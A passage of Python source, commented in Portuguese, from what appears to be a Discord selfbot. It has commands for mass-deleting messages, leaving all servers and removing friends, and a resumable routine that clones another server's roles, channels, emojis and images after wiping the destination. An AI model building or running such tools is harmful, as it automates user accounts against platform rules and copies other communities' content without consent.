                print("  [!] Uso: cl <canal_id ou user_id>")
                return
            target = parts[1]
            channel_id = await self.resolve_channel(target)
            if channel_id:
                await self.purge_my_messages(channel_id)

        elif cmd == "clall":
            await self.purge_all_dms()

        elif cmd == "cldms":
            try:
                await self.purge_open_dms_only()
            except Exception as e:
                print(f"  [warn] cldms interrompido por erro inesperado: {e}")

        elif cmd == "clfull":
            try:
                await self.purge_from_data_package()
            except Exception as e:
                print(f"  [warn] clfull interrompido por erro inesperado: {e}")

        elif cmd == "farmcall":
            if len(parts) < 2:
                print("  [!] Uso: farmcall <canal_id> [mute|deafen] ou farmcall leave")
                return
            if parts[1].lower() == "leave":
                await self.leave_voice_channel()
            else:
                voice_id = parts[1]
                mode = parts[2].lower() if len(parts) >= 3 else ""
                self_mute = mode in ("mute", "deafen")
                self_deaf = mode == "deafen"
                await self.join_voice_channel(voice_id, self_mute=self_mute, self_deaf=self_deaf)

        elif cmd == "quitservers":
            await self.quit_all_servers()

        elif cmd == "removefriends":
            await self.remove_all_friends()

        else:
            print(f"  [!] Comando desconhecido: '{cmd}'. Digite 'help' para ver os comandos.")

    async def start(self):
        """Inicia o bot com reconexao automatica."""
        while self.running:
            try:
                await self.listen()
            except Exception as e:
                print(f"{self._tag()} [!] Erro: {e}")
            if not self.running:
                break
            await asyncio.sleep(5)

    async def stop(self):
        """Desconecta o bot do gateway."""
        self.running = False
        if self.ws and not self.ws.closed:
            await self.ws.close()
        if self.session and not self.session.closed:
            await self.session.close()
        self.user_id = None
        self.username = ""
        self.ws = None
        self.session = None


# Server Clone
CLONE_MAX_AUTO_RATE_LIMIT_WAIT = 30.0


class CloneRateLimitPause(Exception):
    def __init__(self, retry_after: float, path: str):
        super().__init__(f"Rate limit longo em {path}: {retry_after:.2f}s")
        self.retry_after = retry_after
        self.path = path


def _clone_retry_after(data) -> float:
    try:
        return float(data.get("retry_after", 5))
    except Exception:
        return 5.0


async def _clone_wait_rate_limit(wait: float, path: str):
    if wait >= CLONE_MAX_AUTO_RATE_LIMIT_WAIT:
        raise CloneRateLimitPause(wait, path)
    print(f"  [rate-limit] Esperando {wait:.2f}s...")
    await asyncio.sleep(wait + 0.5)


async def _clone_api_get(session, token, path, params=None):
    """GET genArico para clone (funciona com qualquer token)."""
    url = f"{API_BASE}{path}"
    try:
        async with session.get(url, headers=get_headers(token, with_content_type=False), params=params) as resp:
            if resp.status == 429:
                data = await resp.json()
                wait = _clone_retry_after(data)
                await _clone_wait_rate_limit(wait, path)
                return await _clone_api_get(session, token, path, params)
            if resp.status == 200:
                return await resp.json()
            return None
    except aiohttp.ClientResponseError as e:
        print(f"  [!] GET {path} falhou: {e.message}")
        return None
    except (aiohttp.ClientError, asyncio.TimeoutError) as e:
        print(f"  [!] Erro de conexao em GET {path}: {e}")
        return None

async def _clone_api_post(session, token, path, json_body=None):
    """POST genArico para clone."""
    url = f"{API_BASE}{path}"
    async with session.post(url, headers=get_headers(token), json=json_body) as resp:
        if resp.status == 429:
            data = await resp.json()
            wait = _clone_retry_after(data)
            await _clone_wait_rate_limit(wait, path)
            return await _clone_api_post(session, token, path, json_body)
        if resp.status in (200, 201):
            return await resp.json()
        try:
            err = await resp.json()
            print(f"  [!] POST {path} -> {resp.status}: {err.get('message', '')}")
        except Exception:
            print(f"  [!] POST {path} -> {resp.status}")
        return None

async def _clone_api_patch(session, token, path, json_body=None):
    """PATCH genArico para clone."""
    url = f"{API_BASE}{path}"
    async with session.patch(url, headers=get_headers(token), json=json_body) as resp:
        if resp.status == 429:
            data = await resp.json()
            wait = _clone_retry_after(data)
            await _clone_wait_rate_limit(wait, path)
            return await _clone_api_patch(session, token, path, json_body)
        if resp.status == 200:
            return await resp.json()
        return None

async def _clone_api_delete(session, token, path):
    """DELETE genArico para clone."""
    url = f"{API_BASE}{path}"
    async with session.delete(url, headers=get_headers(token)) as resp:
        if resp.status == 429:
            data = await resp.json()
            wait = _clone_retry_after(data)
            await _clone_wait_rate_limit(wait, path)
            return await _clone_api_delete(session, token, path)
        return resp.status in (200, 204)


def _clone_progress_file(source_id: str, dest_id: str, is_bot: bool) -> str:
    mode = "bot" if is_bot else "normal"
    return os.path.join(SCRIPT_DIR, f"server_clone_progress_{source_id}_{dest_id}_{mode}.json")


def _default_clone_progress(source_id: str, dest_id: str, is_bot: bool) -> dict:
    return {
        "version": 1,
        "source_id": str(source_id),
        "dest_id": str(dest_id),
        "mode": "bot" if is_bot else "normal",
        "updated_at": "",
        "completed": [],
        "role_map": {},
        "category_map": {},
        "channel_map": {},
        "emoji_map": {},
        "created_sticker_ids": [],
        "created_sound_ids": [],
        "created_automod_names": [],
        "server_tag_done": False,
    }


def _normalize_clone_progress(progress: dict, source_id: str, dest_id: str, is_bot: bool) -> dict:
    base = _default_clone_progress(source_id, dest_id, is_bot)
    if not isinstance(progress, dict):
        return base
    if str(progress.get("source_id")) != str(source_id) or str(progress.get("dest_id")) != str(dest_id):
        return base
    if progress.get("mode") != base["mode"]:
        return base

    for key, value in progress.items():
        if key in base:
            base[key] = value

    for key in ("role_map", "category_map", "channel_map", "emoji_map"):
        if not isinstance(base.get(key), dict):
            base[key] = {}
        base[key] = {str(k): str(v) for k, v in base[key].items() if k and v}

    for key in ("completed", "created_sticker_ids", "created_sound_ids", "created_automod_names"):
        if not isinstance(base.get(key), list):
            base[key] = []
        base[key] = [str(v) for v in base[key] if v is not None]

    base["server_tag_done"] = bool(base.get("server_tag_done"))
    return base


def _load_clone_progress(source_id: str, dest_id: str, is_bot: bool) -> dict | None:
    path = _clone_progress_file(source_id, dest_id, is_bot)
    if not os.path.exists(path):
        return None
    try:
        with open(path, "r", encoding="utf-8") as f:
            return _normalize_clone_progress(json.load(f), source_id, dest_id, is_bot)
    except Exception:
        return None


def _list_clone_progresses() -> list[dict]:
    entries = []
    prefix = "server_clone_progress_"
    suffix = ".json"

    try:
        filenames = os.listdir(SCRIPT_DIR)
    except Exception:
        return entries

    for filename in filenames:
        if not filename.startswith(prefix) or not filename.endswith(suffix):
            continue
        if filename.endswith(".tmp"):
            continue

        path = os.path.join(SCRIPT_DIR, filename)
        try:
            with open(path, "r", encoding="utf-8") as f:
                raw = json.load(f)
        except Exception:
            continue

        source_id = str(raw.get("source_id") or "").strip()
        dest_id = str(raw.get("dest_id") or "").strip()
        mode = str(raw.get("mode") or "").strip()
        if not source_id or not dest_id or mode not in ("normal", "bot"):
            continue

        progress = _normalize_clone_progress(raw, source_id, dest_id, mode == "bot")
        entries.append({
            "source_id": source_id,
            "dest_id": dest_id,
            "mode": mode,
            "updated_at": progress.get("updated_at") or "",
            "completed_count": len(progress.get("completed", [])),
            "path": path,
        })

    entries.sort(key=lambda item: item.get("updated_at") or "", reverse=True)
    return entries


def _save_clone_progress(progress: dict):
    path = _clone_progress_file(progress["source_id"], progress["dest_id"], progress.get("mode") == "bot")
    progress["updated_at"] = datetime.now().isoformat(timespec="seconds")
    tmp = f"{path}.tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(progress, f, ensure_ascii=False, indent=2)
    os.replace(tmp, path)


def _clear_clone_progress(source_id: str, dest_id: str, is_bot: bool):
    path = _clone_progress_file(source_id, dest_id, is_bot)
    for p in (path, f"{path}.tmp"):
        try:
            if os.path.exists(p):
                os.remove(p)
        except Exception:
            pass


async def clone_server(session, token, source_id: str, dest_id: str,
                       write_session=None, write_token=None, write_headers_fn=None, is_bot=False,
                       resume_progress=False, media_rate_limit_handler=None):
    """Clona a estrutura de um servidor para outro.
    Se write_session/write_token forem fornecidos, usa-os para escrita (modo bot).
    Caso contrArio, usa session/token para tudo (modo normal)."""
    r_session = session        # sessAo de leitura (origem)
    r_token = token            # token de leitura (origem)
    w_session = write_session or session   # sessAo de escrita (destino)
    w_token = write_token or token         # token de escrita (destino)
    w_headers = write_headers_fn or get_headers  # funAAo de headers de escrita
    _clone_d = get_delay("clone_bot" if is_bot else "clone_normal")
    delay_min = _clone_d[0]
    delay_max = _clone_d[1]
    emoji_delay_min = max(delay_min, 15.0 if is_bot else 8.0)
    emoji_delay_max = max(delay_max, 25.0 if is_bot else 12.0)
    emoji_batch_size = 10
    emoji_batch_pause_min = 35.0 if is_bot else 20.0
    emoji_batch_pause_max = 60.0 if is_bot else 35.0
    media_delay_min = max(delay_min, 4.0 if is_bot else 2.5)
    media_delay_max = max(delay_max, 7.0 if is_bot else 4.5)

    # Helpers internos para leitura e escrita com tokens separados
    async def r_get(path, params=None):
        return await _clone_api_get(r_session, r_token, path, params)

    async def w_post(path, json_body=None):
        url = f"{API_BASE}{path}"
        async with w_session.post(url, headers=w_headers(w_token), json=json_body) as resp:
            if resp.status == 429:
                data = await resp.json()
                wait = _clone_retry_after(data)
                await _clone_wait_rate_limit(wait, path)
                return await w_post(path, json_body)
            if resp.status in (200, 201):
                return await resp.json()
            try:
                err = await resp.json()
                print(f"  [!] POST {path} -> {resp.status}: {err.get('message', '')}")
            except Exception:
                print(f"  [!] POST {path} -> {resp.status}")
            return None

    async def w_patch(path, json_body=None):
        url = f"{API_BASE}{path}"
        async with w_session.patch(url, headers=w_headers(w_token), json=json_body) as resp:
            if resp.status == 429:
                data = await resp.json()
                wait = _clone_retry_after(data)
                await _clone_wait_rate_limit(wait, path)
                return await w_patch(path, json_body)
            if resp.status == 200:
                return await resp.json()
            try:
                err = await resp.json()
                print(f"  [!] PATCH {path} -> {resp.status}: {err.get('message', '')}")
            except Exception:
                print(f"  [!] PATCH {path} -> {resp.status}")
            return None

    async def w_patch_verbose(path, json_body=None):
        url = f"{API_BASE}{path}"
        async with w_session.patch(url, headers=w_headers(w_token), json=json_body) as resp:
            if resp.status == 429:
                data = await resp.json()
                wait = _clone_retry_after(data)
                await _clone_wait_rate_limit(wait, path)
                return await w_patch_verbose(path, json_body)
            if resp.status == 200:
                return await resp.json(), resp.status, ""
            try:
                err = await resp.json()
                return None, resp.status, err.get("message", "")
            except Exception:
                return None, resp.status, ""

    async def w_delete(path):
        url = f"{API_BASE}{path}"
        async with w_session.delete(url, headers=w_headers(w_token)) as resp:
            if resp.status == 429:
                data = await resp.json()
                wait = _clone_retry_after(data)
                await _clone_wait_rate_limit(wait, path)
                return await w_delete(path)
            return resp.status in (200, 204)

    async def w_get(path, params=None):
        url = f"{API_BASE}{path}"
        async with w_session.get(url, headers=w_headers(w_token, with_content_type=False), params=params) as resp:
            if resp.status == 429:
                data = await resp.json()
                wait = _clone_retry_after(data)
                await _clone_wait_rate_limit(wait, path)
                return await w_get(path, params)
            if resp.status == 200:
                return await resp.json()
            return None

    async def w_post_form(path, form):
        url = f"{API_BASE}{path}"
        async with w_session.post(url, headers=w_headers(w_token, with_content_type=False), data=form) as resp:
            if resp.status == 429:
                data = await resp.json()
                wait = _clone_retry_after(data)
                await _clone_wait_rate_limit(wait, path)
                return await w_post_form(path, form)
            if resp.status in (200, 201):
                return await resp.json()
            try:
                err = await resp.json()
                print(f"  [!] POST {path} -> {resp.status}: {err.get('message', '')}")
            except Exception:
                print(f"  [!] POST {path} -> {resp.status}")
            return None

    async def w_post_form_verbose(path, form):
        url = f"{API_BASE}{path}"
        async with w_session.post(url, headers=w_headers(w_token, with_content_type=False), data=form) as resp:
            if resp.status == 429:
                data = await resp.json()
                wait = _clone_retry_after(data)
                await _clone_wait_rate_limit(wait, path)
                return await w_post_form_verbose(path, form)
            if resp.status in (200, 201):
                return await resp.json(), resp.status, ""
            try:
                err = await resp.json()
                return None, resp.status, err.get("message", "")
            except Exception:
                return None, resp.status, ""

    async def w_post_verbose(path, json_body=None):
        url = f"{API_BASE}{path}"
        async with w_session.post(url, headers=w_headers(w_token), json=json_body) as resp:
            if resp.status == 429:
                data = await resp.json()
                wait = _clone_retry_after(data)
                await _clone_wait_rate_limit(wait, path)
                return await w_post_verbose(path, json_body)
            if resp.status in (200, 201):
                return await resp.json(), resp.status, ""
            try:
                err = await resp.json()
                return None, resp.status, err.get("message", "")
            except Exception:
                return None, resp.status, ""

    async def download_bytes(url):
        try:
            async with r_session.get(url) as resp:
                if resp.status == 200:
                    return await resp.read(), resp.headers.get("Content-Type", "")
        except Exception:
            pass
        return None, ""

    async def download_data_uri(url, fallback_mime):
        data, content_type = await download_bytes(url)
        if not data:
            return None
        mime = (content_type.split(";")[0] if content_type else fallback_mime) or fallback_mime
        return f"data:{mime};base64,{base64.b64encode(data).decode('utf-8')}"

    def map_role_id(role_id):
        return role_map.get(str(role_id))

    def map_channel_id(channel_id):
        if not channel_id:
            return None
        return channel_map.get(str(channel_id))

    def map_overwrites(overwrites):
        mapped = []
        skipped = 0
        for ow in overwrites or []:
            ow_id = str(ow.get("id", ""))
            ow_type = ow.get("type")
            mapped_id = ow_id
            if ow_type == 0:
                mapped_id = role_map.get(ow_id)
                if not mapped_id:
                    skipped += 1
                    continue
            mapped.append({
                "id": mapped_id,
                "type": ow_type,
                "allow": str(ow.get("allow", "0")),
                "deny": str(ow.get("deny", "0")),
            })
        return mapped, skipped

    def map_roles(role_ids):
        mapped = []
        for role_id in role_ids or []:
            mapped_id = map_role_id(role_id)
            if mapped_id:
                mapped.append(mapped_id)
        return mapped
    print(f"\n  {BRANCO}[{AZUL}*{BRANCO}]{NC} Buscando dados do servidor de origem...")

    # 1. Buscar dados do servidor de origem
    source = await r_get(f"/guilds/{source_id}")
    if not source:
        print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Nao foi possivel acessar o servidor de origem.")
        return False

    source_roles = source.get("roles", [])
    source_channels = await r_get(f"/guilds/{source_id}/channels")
    if source_channels is None:
        print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Nao foi possivel obter canais do servidor de origem.")
        return False

    # 2. Buscar dados do servidor de destino
    dest = await w_get(f"/guilds/{dest_id}")
    if not dest:
        print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Nao foi possivel acessar o servidor de destino.")
        return False

    if resume_progress:
        progress = _load_clone_progress(source_id, dest_id, is_bot)
        if progress:
            print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Retomando server clone anterior ({progress.get('updated_at', 'sem data')}).")
        else:
            print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Progresso anterior nao encontrado/valido. Iniciando do zero.")
            progress = _default_clone_progress(source_id, dest_id, is_bot)
            _save_clone_progress(progress)
    else:
        _clear_clone_progress(source_id, dest_id, is_bot)
        progress = _default_clone_progress(source_id, dest_id, is_bot)
        _save_clone_progress(progress)

    completed_steps = set(progress.get("completed", []))
    role_map = progress.get("role_map", {})
    category_map = progress.get("category_map", {})
    channel_map = progress.get("channel_map", {})
    emoji_map = progress.get("emoji_map", {})

    def save_progress():
        progress["role_map"] = role_map
        progress["category_map"] = category_map
        progress["channel_map"] = channel_map
        progress["emoji_map"] = emoji_map
        progress["completed"] = sorted(completed_steps)
        _save_clone_progress(progress)

    def mark_done(step: str):
        completed_steps.add(step)
        save_progress()

    async def handle_media_rate_limit(exc: CloneRateLimitPause, media_step: str) -> str:
        save_progress()
        if media_rate_limit_handler:
            action = await media_rate_limit_handler(exc, media_step)
        else:
            action = "stop"

        if action == "skip_all":
            for step in ("emojis", "stickers", "soundboards"):
                completed_steps.add(step)
            save_progress()
            print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Midia marcada como pulada. Continuando o clone...")
            return action

        if action == "skip":
            mark_done(media_step)
            print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Etapa '{media_step}' marcada como pulada. Continuando o clone...")
            return action

        raise exc

    async def clone_emojis_in_background() -> str:
        if "emojis" in completed_steps:
            print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Emojis ja foram processados.")
            return "done"

        print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} Clonando emojis em segundo plano...")
        try:
            source_emojis = await r_get(f"/guilds/{source_id}/emojis")
            if source_emojis is None:
                source_emojis = source.get("emojis", [])

            cloned_emojis = 0
            attempted_in_batch = 0
            for emoji in source_emojis or []:
                if emoji.get("managed"):
                    continue
                emoji_id = emoji.get("id")
                emoji_name = emoji.get("name")
                if not emoji_id or not emoji_name:
                    continue
                if str(emoji_id) in emoji_map:
                    cloned_emojis += 1
                    print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Emoji ja clonado, pulando: {emoji_name}")
                    continue

                ext = "gif" if emoji.get("animated") else "png"
                emoji_url = f"https://cdn.discordapp.com/emojis/{emoji_id}.{ext}?quality=lossless"
                image_data = await download_data_uri(emoji_url, "image/gif" if ext == "gif" else "image/png")
                if not image_data:
                    print(f"  [!] Falha ao baixar emoji: {emoji_name}")
                    continue

                emoji_payload = {
                    "name": emoji_name,
                    "image": image_data,
                    "roles": map_roles(emoji.get("roles", [])),
                }
                new_emoji = await w_post(f"/guilds/{dest_id}/emojis", emoji_payload)
                attempted_in_batch += 1
                if new_emoji:
                    emoji_map[str(emoji_id)] = new_emoji.get("id")
                    save_progress()
                    cloned_emojis += 1
                    print(f"  \033[92m*\033[0m Emoji criado: {emoji_name}")
                else:
                    print(f"  [!] Falha ao criar emoji: {emoji_name}")

                if attempted_in_batch >= emoji_batch_size:
                    pause = random.uniform(emoji_batch_pause_min, emoji_batch_pause_max)
                    print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Lote de {emoji_batch_size} emojis concluido; pausando {pause:.1f}s em segundo plano.")
                    attempted_in_batch = 0
                    await asyncio.sleep(pause)
                else:
                    await asyncio.sleep(random.uniform(emoji_delay_min, emoji_delay_max))

            if not cloned_emojis:
                print(f"  {BRANCO}[{AZUL}-{BRANCO}]{NC} Nenhum emoji customizado clonado.")
            mark_done("emojis")
            return "done"
        except CloneRateLimitPause as e:
            save_progress()
            minutes = e.retry_after / 60
            print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Endpoint de emojis em rate limit ({minutes:.1f} min). O resto do clone vai continuar.")
            return "rate_limited"

    dest_channels = await w_get(f"/guilds/{dest_id}/channels")
    dest_roles = dest.get("roles", [])

    # 3. Deletar canais existentes no destino
    if "delete_channels" in completed_steps:
        print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Canais do destino ja foram limpos no progresso anterior.")
    else:
        print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} Limpando canais do servidor de destino...")
        if dest_channels:
            for ch in dest_channels:
                await w_delete(f"/channels/{ch['id']}")
                await asyncio.sleep(random.uniform(delay_min, delay_max))
        mark_done("delete_channels")

    # 4. Deletar roles existentes no destino (exceto @everyone)
    if "delete_roles" in completed_steps:
        print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Roles do destino ja foram limpas no progresso anterior.")
    else:
        print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} Limpando roles do servidor de destino...")
        for role in dest_roles:
            if role["id"] == dest_id:  # @everyone tem o mesmo ID do guild
                continue
            if role.get("managed"):  # roles de bots/integraAAes nao podem ser deletadas
                continue
            await w_delete(f"/guilds/{dest_id}/roles/{role['id']}")
            await asyncio.sleep(random.uniform(delay_min, delay_max))
        mark_done("delete_roles")

    # 5. Clonar roles (do mais baixo para o mais alto)
    print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} Clonando roles...")
    # Filtra @everyone e roles managed, ordena por position decrescente (topo primeiro)
    roles_to_clone = sorted(
        [r for r in source_roles if r["id"] != source_id and not r.get("managed")],
        key=lambda r: r.get("position", 0),
        reverse=True
    )

    for role in roles_to_clone:
        if str(role["id"]) in role_map:
            print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Role ja clonada, pulando: {role['name']}")
            continue
        role_data = {
            "name": role["name"],
            "permissions": str(role.get("permissions", "0")),
            "color": role.get("color", 0),
            "hoist": role.get("hoist", False),
            "mentionable": role.get("mentionable", False),
        }
        # Emoji Unicode como icone do cargo (requer boost nAvel 2)
        if role.get("unicode_emoji"):
            role_data["unicode_emoji"] = role["unicode_emoji"]
        # icone custom do cargo (imagem) -> baixa e reenvia como base64
        if role.get("icon"):
            icon_url = f"https://cdn.discordapp.com/role-icons/{role['id']}/{role['icon']}.png?size=128"
            icon_data = await download_data_uri(icon_url, "image/png")
            if icon_data:
                role_data["icon"] = icon_data
        role_had_boost_fields = bool(role_data.get("icon") or role_data.get("unicode_emoji"))
        new_role, status, message = await w_post_verbose(f"/guilds/{dest_id}/roles", role_data)
        if not new_role and role_had_boost_fields and status == 403 and "boost" in message.lower():
            fallback_role_data = dict(role_data)
            fallback_role_data.pop("icon", None)
            fallback_role_data.pop("unicode_emoji", None)
            print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Destino sem boost/recurso para icone de cargo; criando '{role['name']}' sem icone.")
            new_role, status, message = await w_post_verbose(f"/guilds/{dest_id}/roles", fallback_role_data)

        if new_role:
            role_map[str(role["id"])] = str(new_role["id"])
            save_progress()
            print(f"  \033[92m*\033[0m Role criada: {role['name']}")
        else:
            detail = f" (HTTP {status}: {message})" if status else ""
            print(f"  [!] Falha ao criar role: {role['name']}{detail}")
        await asyncio.sleep(random.uniform(delay_min, delay_max))

    # Mapeia @everyone source -> @everyone dest
    role_map[str(source_id)] = str(dest_id)
    save_progress()
    source_everyone = next((r for r in source_roles if r["id"] == source_id), None)
    if source_everyone and "everyone_role" not in completed_steps:
        everyone_payload = {
            "permissions": str(source_everyone.get("permissions", "0")),
            "color": source_everyone.get("color", 0),
            "hoist": source_everyone.get("hoist", False),
            "mentionable": source_everyone.get("mentionable", False),
        }
        if await w_patch(f"/guilds/{dest_id}/roles/{dest_id}", everyone_payload):
            print(f"  \033[92m*\033[0m Permissoes do @everyone copiadas")
        mark_done("everyone_role")

    # 5.1. Reordenar roles no destino
    if "role_positions" in completed_steps:
        print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Ordem das roles ja foi aplicada no progresso anterior.")
    else:
        print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} Reordenando roles...")
        role_positions = []
        for src_role in roles_to_clone:
            dest_role_id = role_map.get(str(src_role["id"]))
            if dest_role_id:
                role_positions.append({
                    "id": dest_role_id,
                    "position": src_role.get("position", 0),
                })
        role_positions_ok = True
        if role_positions:
            _, status, message = await w_patch_verbose(f"/guilds/{dest_id}/roles", role_positions)
            if status == 200:
                print(f"  \033[92m*\033[0m Ordem das roles aplicada")
            elif status in (400, 403) and "permission" in (message or "").lower():
                role_positions_ok = False
                print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Nao foi possivel reordenar roles: coloque o cargo do bot acima das roles criadas e retome o clone.")
            else:
                role_positions_ok = False
                detail = f"HTTP {status}: {message}" if status else "sem resposta"
                print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Nao foi possivel reordenar roles ({detail}).")
        if role_positions_ok:
            mark_done("role_positions")

    # 5.2. Clonar emojis customizados em paralelo ao restante do clone
    emoji_task = asyncio.create_task(clone_emojis_in_background())

    # 6. Clonar categorias
    print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} Clonando categorias...")
    categories = sorted(
        [ch for ch in source_channels if ch["type"] == 4],
        key=lambda ch: ch.get("position", 0)
    )

    for cat in categories:
        if str(cat["id"]) in category_map:
            print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Categoria ja clonada, pulando: {cat['name']}")
            continue
        overwrites, skipped_overwrites = map_overwrites(cat.get("permission_overwrites", []))

        cat_data = {
            "name": cat["name"],
            "type": 4,
            "position": cat.get("position", 0),
            "permission_overwrites": overwrites,
        }
        new_cat = await w_post(f"/guilds/{dest_id}/channels", cat_data)
        if new_cat:
            category_map[str(cat["id"])] = str(new_cat["id"])
            channel_map[str(cat["id"])] = str(new_cat["id"])
            save_progress()
            print(f"  \033[92m*\033[0m Categoria criada: {cat['name']}")
            if skipped_overwrites:
                print(f"    [i] {skipped_overwrites} overwrite(s) de role gerenciada/nao clonada foram ignorados.")
        else:
            print(f"  [!] Falha ao criar categoria: {cat['name']}")
        await asyncio.sleep(random.uniform(delay_min, delay_max))

    # 7. Clonar canais (texto, voz, etc.)
    print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} Clonando canais...")
    channels_to_clone = sorted(
        [ch for ch in source_channels if ch["type"] != 4],
        key=lambda ch: (ch.get("parent_id") or "", ch.get("position", 0))
    )

    for ch in channels_to_clone:
        if str(ch["id"]) in channel_map:
            print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Canal ja clonado, pulando: {ch['name']}")
            continue
        overwrites, skipped_overwrites = map_overwrites(ch.get("permission_overwrites", []))

        ch_data = {
            "name": ch["name"],
            "type": ch["type"],
            "position": ch.get("position", 0),
            "permission_overwrites": overwrites,
        }

        # Canal dentro de categoria
        parent_id = ch.get("parent_id")
        if parent_id and str(parent_id) in category_map:
            ch_data["parent_id"] = category_map[str(parent_id)]

        # Propriedades extras por tipo
        if ch["type"] == 0:  # texto
            ch_data["topic"] = ch.get("topic") or ""
            ch_data["nsfw"] = ch.get("nsfw", False)
            rate = ch.get("rate_limit_per_user", 0)
            if rate:
                ch_data["rate_limit_per_user"] = rate
            if ch.get("default_auto_archive_duration"):
                ch_data["default_auto_archive_duration"] = ch.get("default_auto_archive_duration")
            if ch.get("default_thread_rate_limit_per_user") is not None:
                ch_data["default_thread_rate_limit_per_user"] = ch.get("default_thread_rate_limit_per_user")
        elif ch["type"] in (2, 13):  # voz / stage
            ch_data["bitrate"] = ch.get("bitrate", 64000)
            ch_data["user_limit"] = ch.get("user_limit", 0)
            if ch.get("rtc_region") is not None:
                ch_data["rtc_region"] = ch.get("rtc_region")
            if ch.get("video_quality_mode") is not None:
                ch_data["video_quality_mode"] = ch.get("video_quality_mode")
            rate = ch.get("rate_limit_per_user", 0)
            if rate:
                ch_data["rate_limit_per_user"] = rate
        elif ch["type"] == 5:  # announcement
            ch_data["topic"] = ch.get("topic") or ""
            if ch.get("default_auto_archive_duration"):
                ch_data["default_auto_archive_duration"] = ch.get("default_auto_archive_duration")
        elif ch["type"] == 15:  # forum
            ch_data["topic"] = ch.get("topic") or ""
            ch_data["nsfw"] = ch.get("nsfw", False)
            if ch.get("rate_limit_per_user"):
                ch_data["rate_limit_per_user"] = ch.get("rate_limit_per_user")
            if ch.get("default_auto_archive_duration"):
                ch_data["default_auto_archive_duration"] = ch.get("default_auto_archive_duration")
            if ch.get("default_thread_rate_limit_per_user") is not None:
                ch_data["default_thread_rate_limit_per_user"] = ch.get("default_thread_rate_limit_per_user")
            if ch.get("default_sort_order") is not None:
                ch_data["default_sort_order"] = ch.get("default_sort_order")
            if ch.get("default_forum_layout") is not None:
                ch_data["default_forum_layout"] = ch.get("default_forum_layout")
            if ch.get("default_reaction_emoji"):
                reaction = ch.get("default_reaction_emoji") or {}
                ch_data["default_reaction_emoji"] = {
                    "emoji_id": None,
                    "emoji_name": reaction.get("emoji_name"),
                }
            if ch.get("available_tags"):
                tags = []
                for tag in ch.get("available_tags", []):
                    tags.append({
                        "name": tag.get("name", ""),
                        "moderated": tag.get("moderated", False),
                        "emoji_id": None,
                        "emoji_name": tag.get("emoji_name"),
                    })
                ch_data["available_tags"] = tags

        new_ch = await w_post(f"/guilds/{dest_id}/channels", ch_data)
        if new_ch:
            channel_map[str(ch["id"])] = str(new_ch["id"])
            save_progress()
            type_names = {0: "texto", 2: "voz", 5: "anuncio", 13: "stage", 15: "forum"}
            tname = type_names.get(ch["type"], f"type={ch['type']}")
            print(f"  \033[92m*\033[0m Canal criado: {ch['name']} ({tname})")
            if skipped_overwrites:
                print(f"    [i] {skipped_overwrites} overwrite(s) de role gerenciada/nao clonada foram ignorados.")
        else:
            print(f"  [!] Falha ao criar canal: {ch['name']}")
        await asyncio.sleep(random.uniform(delay_min, delay_max))

    async def patch_guild_image(label, field, cdn_path, fallback_mime):
        data_uri = await download_data_uri(cdn_path, fallback_mime)
        if not data_uri:
            print(f"  [!] Falha ao baixar {label}.")
            return
        if await w_patch(f"/guilds/{dest_id}", {field: data_uri}):
            print(f"  \033[92m*\033[0m {label} copiado")
        else:
            print(f"  [!] Nao foi possivel aplicar {label} (permissao, boost ou formato do destino).")

    if "guild_settings" in completed_steps:
        print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Configuracoes/imagens do servidor ja foram aplicadas.")
    else:
        # 8. Atualizar configuracoes e imagens do servidor
        print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} Atualizando servidor (configuracoes, nome, imagens)...")

        settings_patch = {
            "name": source.get("name", "Cloned Server"),
            "verification_level": source.get("verification_level", 0),
            "default_message_notifications": source.get("default_message_notifications", 0),
            "explicit_content_filter": source.get("explicit_content_filter", 0),
            "afk_timeout": source.get("afk_timeout", 300),
            "system_channel_flags": source.get("system_channel_flags", 0),
            "preferred_locale": source.get("preferred_locale", "en-US"),
            "description": source.get("description"),
            "premium_progress_bar_enabled": source.get("premium_progress_bar_enabled", False),
        }

        for src_key, dst_key in (
            ("afk_channel_id", "afk_channel_id"),
            ("system_channel_id", "system_channel_id"),
            ("rules_channel_id", "rules_channel_id"),
            ("public_updates_channel_id", "public_updates_channel_id"),
            ("safety_alerts_channel_id", "safety_alerts_channel_id"),
        ):
            mapped = map_channel_id(source.get(src_key))
            if mapped:
                settings_patch[dst_key] = mapped

        if await w_patch(f"/guilds/{dest_id}", settings_patch):
            print(f"  \033[92m*\033[0m Configuracoes basicas do servidor copiadas")

        source_icon = source.get("icon")
        if source_icon:
            ext = "gif" if source_icon.startswith("a_") else "png"
            mime = "image/gif" if ext == "gif" else "image/png"
            await patch_guild_image(
                "icone do servidor",
                "icon",
                f"https://cdn.discordapp.com/icons/{source_id}/{source_icon}.{ext}?size=1024",
                mime,
            )

        source_banner = source.get("banner")
        if source_banner:
            ext = "gif" if source_banner.startswith("a_") else "png"
            mime = "image/gif" if ext == "gif" else "image/png"
